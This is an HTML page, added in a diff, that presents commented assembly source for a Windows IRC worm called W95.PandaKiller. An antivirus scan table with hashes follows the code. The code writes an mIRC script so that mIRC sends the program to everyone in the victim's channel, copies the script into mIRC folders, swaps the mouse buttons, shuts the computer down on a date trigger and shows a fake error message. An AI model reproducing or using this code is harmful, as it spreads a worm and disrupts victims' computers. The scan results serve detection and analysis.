+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000080h</span><span class="sc0">                  </span><span class="sc1">; pratique pour envoyer notre</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000002h</span><span class="sc0">                  </span><span class="sc1">; programme un peu partout.</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000001h</span><span class="sc0">                  </span><span class="sc1">; C'est mIRC. </span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">40000000h</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ini</span><span class="sc0">                 </span><span class="sc1">; En utilisant un script, mIRC va </span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc0">                </span><span class="sc1">; automatiquement envoyer notre </span><span class="sc0">
+        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc5">fh</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">; programme … tous ceux qui se trouve</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">                        </span><span class="sc1">; dans le CHANNEL de la victime.</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">octets</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">initaille</span><span class="sc0">                  </span><span class="sc1">; Pour cela, on va ‚crire le script</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">inid</span><span class="sc0">                </span><span class="sc1">; dans le dossier C:\
+        push [fh]                       ;</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">WriteFile</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fh</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
+                                        
+</span><span class="sc5">COPIE</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">                  </span><span class="sc1">; Puis on va le copier dans les</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">script1</span><span class="sc0">             </span><span class="sc1">; dossier suivant :</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ini</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CopyFileA</span><span class="sc0">                  </span><span class="sc1">; C:\mirc</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">script2</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ini</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CopyFileA</span><span class="sc0">                  </span><span class="sc1">; C:\mirc32</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">script3</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ini</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CopyFileA</span><span class="sc0">                  </span><span class="sc1">; C:\program files\mirc</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">script4</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ini</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CopyFileA</span><span class="sc0">                  </span><span class="sc1">; C:\program files\mirc32</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ini</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">DeleteFileA</span><span class="sc0">                </span><span class="sc1">; Puis efface l'original.</span><span class="sc0">
+
+</span><span class="sc5">ATTEND</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">60</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">              </span><span class="sc1">; </span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Sleep</span><span class="sc0">                      </span><span class="sc1">; Fait une pause de 1 minute.</span><span class="sc0">
+
+</span><span class="sc5">SOURIS</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SwapMouseButton</span><span class="sc0">            </span><span class="sc1">; Modifie les boutons de la souris.</span><span class="sc0">
+
+</span><span class="sc5">HEURE2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SystemTime</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetSystemTime</span><span class="sc0">              </span><span class="sc1">; Regarde la date du systˆme.</span><span class="sc0">
+        </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc5">SystemTime.wYear</span><span class="sc4">],</span><span class="sc2">7D1h</span><span class="sc0">    </span><span class="sc1">; Si nous ne sommes pas en l'an 2001,</span><span class="sc0">
+        </span><span class="sc6">jne</span><span class="sc0">  </span><span class="sc5">ALERT</span><span class="sc0">                      </span><span class="sc1">; il saute au label ALERT</span><span class="sc0">
+
+</span><span class="sc5">ETEIND</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitWindowsEx</span><span class="sc0">              </span><span class="sc1">; Sinon ‚teind l'ordinateur.</span><span class="sc0">
+
+</span><span class="sc5">ALERT</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TITRE</span><span class="sc0">               </span><span class="sc1">; Affiche le faux message d'erreur.</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TEXTE</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
+
+</span><span class="sc5">FIN</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                          </span><span class="sc1">; </span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">                </span><span class="sc1">; Fin du Programme</span><span class="sc0">
+
+</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">DEBUT</span><span class="sc0">
+</span><br><span class="sc0"><table border="1"><tr><td colspan="4">File W95.PandaKiller.exe received on 2009.06.10 03:34:24 (UTC)</td></tr><tr><td>Antivirus</td><td>Version</td><td>Last Update</td><td>Result</td</tr><tr><td>a-squared</td><td>4.5.0.18</td><td>2009.06.10</td><td style="color: red;">BehavesLike!IK</td</tr><tr><td>AhnLab-V3</td><td>5.0.0.2</td><td>2009.06.09</td><td>-</td</tr><tr><td>AntiVir</td><td>7.9.0.183</td><td>2009.06.09</td><td style="color: red;">HEUR/Malware</td</tr><tr><td>Antiy-AVL</td><td>2.0.3.1</td><td>2009.06.10</td><td style="color: red;">Worm/DOS.Generic</td</tr><tr><td>Authentium</td><td>5.1.2.4</td><td>2009.06.10</td><td>-</td</tr><tr><td>Avast</td><td>4.8.1335.0</td><td>2009.06.09</td><td>-</td</tr><tr><td>AVG</td><td>8.5.0.339</td><td>2009.06.09</td><td style="color: red;">IRC/Generic.dropper</td</tr><tr><td>BitDefender</td><td>7.2</td><td>2009.06.10</td><td style="color: red;">BehavesLike:Win32.IRC-Worm</td</tr><tr><td>CAT-QuickHeal</td><td>10.00</td><td>2009.06.10</td><td>-</td</tr><tr><td>ClamAV</td><td>0.94.1</td><td>2009.06.10</td><td style="color: red;">W32.Ultratt.gz</td</tr><tr><td>Comodo</td><td>1299</td><td>2009.06.10</td><td>-</td</tr><tr><td>DrWeb</td><td>5.0.0.12182</td><td>2009.06.10</td><td style="color: red;">BACKDOOR.Trojan</td</tr><tr><td>eSafe</td><td>7.0.17.0</td><td>2009.06.09</td><td style="color: red;">Win32.HEURMalware</td</tr><tr><td>eTrust-Vet</td><td>31.6.6550</td><td>2009.06.09</td><td>-</td</tr><tr><td>F-Prot</td><td>4.4.4.56</td><td>2009.06.10</td><td>-</td</tr><tr><td>F-Secure</td><td>8.0.14470.0</td><td>2009.06.09</td><td style="color: red;">W32/P2PWorm</td</tr><tr><td>Fortinet</td><td>3.117.0.0</td><td>2009.06.09</td><td style="color: red;">PossibleThreat</td</tr><tr><td>GData</td><td>19</td><td>2009.06.10</td><td style="color: red;">BehavesLike:Win32.IRC-Worm</td</tr><tr><td>Ikarus</td><td>T3.1.1.59.0</td><td>2009.06.10</td><td>-</td</tr><tr><td>K7AntiVirus</td><td>7.10.757</td><td>2009.06.08</td><td>-</td</tr><tr><td>Kaspersky</td><td>7.0.0.125</td><td>2009.06.10</td><td style="color: red;">IRC-Worm.DOS.Generic</td</tr><tr><td>McAfee</td><td>5641</td><td>2009.06.09</td><td style="color: red;">Generic.dx!cz</td</tr><tr><td>McAfee+Artemis</td><td>5641</td><td>2009.06.09</td><td style="color: red;">Generic.dx!cz</td</tr><tr><td>McAfee-GW-Edition</td><td>6.7.6</td><td>2009.06.10</td><td style="color: red;">Heuristic.Malware</td</tr><tr><td>Microsoft</td><td>1.4701</td><td>2009.06.10</td><td>-</td</tr><tr><td>NOD32</td><td>4142</td><td>2009.06.09</td><td style="color: red;">probably unknown NewHeur_PE</td</tr><tr><td>Norman</td><td>6.01.09</td><td>2009.06.09</td><td style="color: red;">W32/P2PWorm</td</tr><tr><td>nProtect</td><td>2009.1.8.0</td><td>2009.06.10</td><td style="color: red;">Worm/W32.Agent.8192.C</td</tr><tr><td>Panda</td><td>10.0.0.14</td><td>2009.06.09</td><td style="color: red;">Trj/CI.A</td</tr><tr><td>PCTools</td><td>4.4.2.0</td><td>2009.06.09</td><td style="color: red;">IRC.Buffy.C</td</tr><tr><td>Prevx</td><td>3.0</td><td>2009.06.10</td><td>-</td</tr><tr><td>Rising</td><td>21.33.20.00</td><td>2009.06.10</td><td>-</td</tr><tr><td>Sophos</td><td>4.42.0</td><td>2009.06.10</td><td style="color: red;">Mal/Generic-A</td</tr><tr><td>Sunbelt</td><td>3.2.1858.2</td><td>2009.06.09</td><td style="color: red;">IRC-Worm.DOS.Generic</td</tr><tr><td>Symantec</td><td>1.4.4.12</td><td>2009.06.10</td><td style="color: red;">W95.Pet_Tick.gen</td</tr><tr><td>TheHacker</td><td>6.3.4.3.342</td><td>2009.06.10</td><td>-</td</tr><tr><td>TrendMicro</td><td>8.950.0.1092</td><td>2009.06.09</td><td style="color: red;">Possible_Virus</td</tr><tr><td>VBA32</td><td>3.12.10.7</td><td>2009.06.10</td><td>-</td</tr><tr><td>ViRobot</td><td>2009.6.9.1775</td><td>2009.06.09</td><td>-</td</tr><tr><td>VirusBuster</td><td>4.6.5.0</td><td>2009.06.09</td><td style="color: red;">IRC.Buffy.C</td</tr><tr><td colspan="4">&nbsp;</td></tr><tr><td colspan="4">Additional information</td></tr><tr><td colspan="4">File size: 8192 bytes</td></tr><tr><td colspan="4">MD5...: f7b2facb5e2c9e5870065004446a8867</td></tr><tr><td colspan="4">SHA1..: 837ce36b596ffab1af92ac1c63506fa613e16e6c</td></tr><tr><td colspan="4">SHA256: 3ac6290f64da9b2e020987fd09a2c514fc6745f4d8e3bc6d33913c99711955d5</td></tr><tr><td colspan="4">ssdeep: -<br></td></tr><tr><td colspan="4">PEiD..: -</td></tr><tr><td colspan="4">TrID..: File type identification<br>Win32 Executable Generic (38.4%)<br>Win32 Dynamic Link Library (generic) (34.1%)<br>Win16/32 Executable Delphi generic (9.3%)<br>Generic Win/DOS Executable (9.0%)<br>DOS Executable Generic (9.0%)</td></tr><tr><td colspan="4">PEInfo: PE Structure information<br><br>( base data )<br>entrypointaddress.: 0x1000<br>timedatestamp.....: 0x54ef3ab0 (Thu Feb 26 15:24:32 2015)<br>machinetype.......: 0x14c (I386)<br><br>( 4 sections )<br>name        viradd    virsiz   rawdsiz  ntrpy  md5<br>CODE        0x1000    0x1000     0x400   3.45  c148754841b1b5653608bfb7082231b1<br>DATA        0x2000    0x1000     0xa00   1.62  1ff33002189c3d86cc258c6d81a55de2<br>.idata      0x3000    0x1000     0x400   3.10  8d5562f0bbbe10976ff52a710d8c93bb<br>.reloc      0x4000    0x1000     0x200   2.36  739030ccca709fd77a076ca0950cbf09<br><br>( 3 imports )  <br>&gt; KERNEL32.dll: lstrcat, CloseHandle, CreateFileA, GetModuleHandleA, DeleteFileA, ExitProcess, GetModuleFileNameA, CopyFileA, GetSystemDirectoryA, GetSystemTime, GetVersionExA, GetWindowsDirectoryA, Sleep, WinExec, WriteFile, WritePrivateProfileStringA<br>&gt; USER32.dll: SwapMouseButton, MessageBoxA, ExitWindowsEx<br>&gt; ADVAPI32.dll: RegCreateKeyExA, RegCloseKey<br><br>( 0 exports ) <br></td></tr><tr><td colspan="4">PDFiD.: -</td></tr><tr><td colspan="4">RDS...: NSRL Reference Data Set<br>-</td></tr><tr><td colspan="4">CWSandbox info: &lt;a href='http://research.sunbelt-software.com/partnerresource/MD5.aspx?md5=f7b2facb5e2c9e5870065004446a8867' target='_blank'&gt;http://research.sunbelt-software.com/partnerresource/MD5.aspx?md5=f7b2facb5e2c9e5870065004446a8867&lt;/a&gt;</td></tr></table></span></div></body>
+</html>
